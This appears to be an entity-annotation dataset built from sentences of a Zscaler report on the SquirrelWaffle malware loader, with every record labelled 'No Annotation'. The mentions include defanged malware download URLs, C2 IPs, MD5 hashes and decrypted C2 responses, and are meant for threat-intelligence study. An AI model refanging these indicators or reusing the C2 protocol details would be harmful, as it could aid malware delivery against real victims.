{"mention": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim’s system information that was previously sent.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "The SquirrelWaffle CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.", "sentence_right": "An example decrypted response is shown below:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://srv7.corpwebcontrol[.]com/np/user\\_est.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://srv7.corpwebcontrol[.]com/np/prog\\_est.zip", "sentence_right": "* hxxp://stripemovired.ramfactoryarg[.]com/nostrum-ab/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://readgasm[.]com/repudiandae-provident/voluptas.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://moeinjelveh[.]ir/et-eligendi/placeat.zip", "sentence_right": "* hxxps://saraviatowing[.]net/et-praesentium/placeat.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "**200\\r\\n\\t\\t\\n\\r1631911856\\r\\n\\t\\t\\n\\r174.197.7.69\\r\\n\\t\\t\\n\\rGEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r**", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "An example decrypted response is shown below:", "sentence_right": "The SquirrelWaffle CnC response may also contain a second-stage payload.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 143[.]95[.]80[.]83 port 80 chaturanga[.]groopy[.]com", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 119[.]235[.]250[.]50 port 80 kmslogistik[.]com", "sentence_right": "* 160[.]153[.]129[.]37 port 80 mercyfoundationcio[.]org", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 166[.]62[.]28[.]139 port 80 jhehosting[.]com", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 160[.]153[.]131[.]187 port 80 spiritofprespa[.]com", "sentence_right": "* 166[.]62[.]28[.]139 port 80 key4net[.]com", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "*hxxps://213.227.154.92/jquery-3.3.1.min.js*", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "*hxxps://systemmentorsec.com/jquery-3.3.1.min.js,*", "sentence_right": "Cloud Sandbox Detection", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "**200\\r\\n\\t\\t\\n\\r1631913267\\r\\n\\t\\t\\n\\r174.197.7.69\\r\\n\\t\\t\\n\\rGEORGE-PC\\t\\tgeorge\\t\\tC:\\\\Users\\\\george\\\\AppData\\\\Roaming\\t\\tWORKGROUP\\t\\t\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rNONE\\r\\n\\t\\t\\n\\rMZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff\\x00\\x00\\xb8\\x00\\x00\\x00\\x00\\x00\\x00\\[[email protected]](/cdn-cgi/l/email-protection)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe8\\x00\\x00\\x00\\x0e\\x1f\\xba\\x0e\\x00\\xb4\\t\\xcd!\\xb8\\x01L\\xcd!This program cannot be run in DOS mode...\\x00\\x00\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r\\r\\n\\t\\t\\n\\r**", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "An example decrypted response is shown below:", "sentence_right": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by SquirrelWaffle.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://procatodicadelacosta[.]com/neque-et/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://prevenzioneformazionelavoro[.]it/quasi-reprehenderit/documents.zip", "sentence_right": "* hxxp://readgasm[.]com/repudiandae-provident/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://inetworx.co[.]za/voluptate-sunt/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://gadhwadasamaj.techofi[.]in/expedita-consequatur/documents.zip", "sentence_right": "* hxxp://insurance.akademiilmujaya[.]com/beatae-sunt/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* fae4ca3c95a5068063637b2f2ed3a5b2", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 5e9f33e5baa6d6efca91c8db78c01bd0", "sentence_right": "* a449e5044437c453fce2ead881aa8161", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 166[.]62[.]28[.]139 port 80 voip[.]voipcallhub[.]com", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 166[.]62[.]28[.]139 port 80 lead[.]jhinfotech[.]co", "sentence_right": "* 166[.]62[.]28[.]139 port 80 voipcallhub[.]com", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "[Win32.Downloader.Squirrelwaffle](https://threatlibrary.zscaler.com/threats/70c5e6f0-db5c-4a55-87de-7c71dab50c36)", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels including the signature shown below:", "sentence_right": "Conclusion", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://insurance.akademiilmujaya[.]com/beatae-sunt/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://inetworx.co[.]za/voluptate-sunt/documents.zip", "sentence_right": "* hxxp://prevenzioneformazionelavoro[.]it/quasi-reprehenderit/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 216[.]219[.]81[.]3 port 80 ems[.]prodigygroupindia[.]com", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 203[.]124[.]44[.]95 port 80 novamarketing[.]com[.]pk", "sentence_right": "* 216[.]219[.]81[.]3 port 80 hrms[.]prodigygroupindia[.]com", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "**Content-Length: 76**", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "**Host: test.dirigu.ro**", "sentence_right": "**eHp+fHZ7Q0ICAAUPQkUMcRYePyo5ORcrKiQ4LCkTCjo7CC4/KxceIConIiIoQkMHHw0CAhoKRkI=**", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://yoowi[.]net/tDzEJ8uVGwdj/130921.html", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://ghapan[.]com/Kdg73onC3oQ/090921.html", "sentence_right": "* hxxps://gruasingenieria[.]pe/LUS1NTVui6/090921.html", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://amaimaging[.]com/voluptas-quidem/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "### Squirrelwaffle ZIP archive URLs", "sentence_right": "* hxxp://beautifulgist[.]com/id-alias/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://orquideavallenata[.]com/4jmDb0s9sg/sec.html", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec.html", "sentence_right": "* hxxps://fundacionverdaderosheroes[.]com/gY0Op5Jkht/sec.html", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://ghapan[.]com/Kdg73onC3oQ/090921.html", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "### Squirrelwaffle Loader URLs", "sentence_right": "* hxxps://yoowi[.]net/tDzEJ8uVGwdj/130921.html", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://builtbybh-com[.]gq/eum-est/voluptas.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://builtbvbh-com[.]gq/eum-est/voluptas.zip", "sentence_right": "* hxxps://builtybybh-com[.]gq/eum-est/voluptas.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "| Tactic | Technique |", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "------------------------", "sentence_right": "| T1059 | Command and Scripting Interpreter |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://saraviatowing[.]net/et-praesentium/placeat.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://readgasm[.]com/repudiandae-provident/voluptas.zip", "sentence_right": "* hxxps://sextoystore.co[.]in/temporibus-aut/est.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "*hxxps://orquideavallenata[.]com/4jmDb0s9sg/sec.html*", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "*hxxps://cortinastelasytrazos[.]com/Yro6Atvj/sec.html*", "sentence_right": "*hxxps://fundacionverdaderosheroes[.]com/gY0Op5Jkht/sec.html*", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* b478bc389fc15e17b231984fa80e2b0d", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* c1ed800a4ae9d4efd61de3aa7fd657b4", "sentence_right": "* e599a656599a2680c9392c7329d9d519", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "MITRE ATT&CK TTP Mapping", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "The Zscaler ThreatLabz team will continue to monitor this attack, as well as others, to help keep our customers safe.", "sentence_right": "------------------------", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://beautifulgist[.]com/id-alias/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://amaimaging[.]com/voluptas-quidem/documents.zip", "sentence_right": "* hxxp://bussiness-z[.]ml/qui-quia/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Indicators of Compromise", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "| T1106 | Native API |", "sentence_right": "------------------------", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 9da69f65ce4e8e57aef3ea1dd96f42ec", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "### Squirrelwaffle VBS File MD5 Hash", "sentence_right": "### Squirrelwaffle Loader MD5 Hashes", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://stripemovired.ramfactoryarg[.]com/nostrum-ab/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://srv7.corpwebcontrol[.]com/np/user\\_est.zip", "sentence_right": "* hxxp://syncun[.]com/natus-aut/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Each field is delimited by a single tab character.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "This encoded string includes an alphanumeric string with a random length between 1 and 28 characters followed by the IP address of the system.", "sentence_right": "An example before encryption is shown below:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 166[.]62[.]28[.]139 port 80 voipcallhub[.]com", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 166[.]62[.]28[.]139 port 80 voip[.]voipcallhub[.]com", "sentence_right": "* 194[.]181[.]228[.]45 port 80 bartek-lenart[.]pl", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "An example before encryption is shown below:", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Each field is delimited by a single tab character.", "sentence_right": "**t2nQfj3SL3XByImciQTqVa\\t192.168.125.11**", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* systemmentorsec[.]com:8080/jquery-3.3.1.min.js", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* systemmentorsec[.]com:443/jquery-3.3.1.min.js", "sentence_right": "", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://cctvfiles[.]xyz/aliquam-ipsam/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://builtybybh-com[.]gq/eum-est/voluptas.zip", "sentence_right": "* hxxps://focus.focalrack[.]com/enim-rerum/ducimus.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 7e9ba57db08f53b56715b0a8121bd839", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "### Squirrelwaffle Loader MD5 Hashes", "sentence_right": "* 5ec89ea30af2cc38ae183d12ffacbcf7", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* db11964b27738bf4e3a1501e11bd54ad", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* c2ed8fc614aeda36a7e3a638fa7db16a", "sentence_right": "* 822e20c95df7165009600a9bfbff9b5e", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 9545905ea3735dcac289eead39e3f893", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* a3ecc9951178447b546b004ea2dfd93f", "sentence_right": "* 732ce2ef4b18042ef9e3f3e52ad59916", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* systemmentorsec[.]com:443/jquery-3.3.1.min.js", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 213.227.154[.]92:8080/jquery-3.3.1.min.js", "sentence_right": "* systemmentorsec[.]com:8080/jquery-3.3.1.min.js", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://abogados-en-medellin[.]com/odit-error/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://tradingview-brokers.skoconstructionng[.]com/molestiae-voluptatum/documents.zip", "sentence_right": "* hxxps://amaimaging[.]com/voluptas-quidem/ducimus.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://gruasingenieria[.]pe/LUS1NTVui6/090921.html", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://yoowi[.]net/tDzEJ8uVGwdj/130921.html", "sentence_right": "* hxxps://chaturanga.groopy[.]com/7SEZBnhMLW/130921.html", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 732ce2ef4b18042ef9e3f3e52ad59916", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 9545905ea3735dcac289eead39e3f893", "sentence_right": "* cb905bb6a38b5d253eb64aab46eafbd7", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* ebeeef845d0d666363935da89a57b44d", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* cb905bb6a38b5d253eb64aab46eafbd7", "sentence_right": "### Unpacked DLL file MD5 Hash", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "-----------------------------", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Malware Distribution Strategy", "sentence_right": "Squirrelwaffle campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique known as email thread hijacking.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://shahanaschool[.]in/illum-accusamus/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://saraviatowing[.]net/et-praesentium/documents.zip", "sentence_right": "* hxxp://srv7.corpwebcontrol[.]com/np/prog\\_est.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "*hxxps://fundacionverdaderosheroes[.]com/gY0Op5Jkht/sec.html*", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "*hxxps://orquideavallenata[.]com/4jmDb0s9sg/sec.html*", "sentence_right": "Technical Analysis of the Payload", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* 213.227.154[.]92:8080/jquery-3.3.1.min.js", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* 213.227.154[.]92:443/jquery-3.3.1.min.js", "sentence_right": "* systemmentorsec[.]com:443/jquery-3.3.1.min.js", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxps://shivrajengineering[.]in/qui-dolores/placeat.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://sextoystore.co[.]in/temporibus-aut/est.zip", "sentence_right": "### Squirrelwaffle Loader URLs", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* hxxp://syncun[.]com/natus-aut/documents.zip", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* hxxp://stripemovired.ramfactoryarg[.]com/nostrum-ab/documents.zip", "sentence_right": "* hxxp://tradingview-brokers.skoconstructionng[.]com/molestiae-voluptatum/documents.zip", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "*hxxps://bonus.corporatebusinessmachines[.]co.in/1Y0qVNce/pt.html*", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "*hxxps://cablingpoint[.]com/ByH5NDoE3kQA/pt.html*", "sentence_right": "Figure 5 shows the ProgramData folder after the VBS script is executed and the Squirrelwaffle payloads have been downloaded", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "* c774e400b46f4c0bb90c11e349bc36a0", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* c27545fbb3b4ff35277bce1383655e46", "sentence_right": "* c2ed8fc614aeda36a7e3a638fa7db16a", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "----------", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Conclusion", "sentence_right": "After the Emotet botnet takedown earlier this year, criminal threat actors are filling that void.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Conclusion", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "[Win32.Downloader.Squirrelwaffle](https://threatlibrary.zscaler.com/threats/70c5e6f0-db5c-4a55-87de-7c71dab50c36)", "sentence_right": "----------", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "*hxxps://bussiness-z[.]ml/ze8pCNTIkrIS/pt.html*", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "*hxxps://perfectdemos[.]com/Gv1iNAuMKZ/pt.html*", "sentence_right": "*hxxps://cablingpoint[.]com/ByH5NDoE3kQA/pt.html*", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "*hxxps://priyacareers[.]com/u9hDQN9Yy7g/pt.html*", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:", "sentence_right": "*hxxps://perfectdemos[.]com/Gv1iNAuMKZ/pt.html*", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "This encoded string includes an alphanumeric string with a random length between 1 and 28 characters followed by the IP address of the system.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "The path of the HTTP POST request consists of a hardcoded prefix and a Base64 encoded string that is encrypted using the same XOR-based algorithm and key as described above.", "sentence_right": "Each field is delimited by a single tab character.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
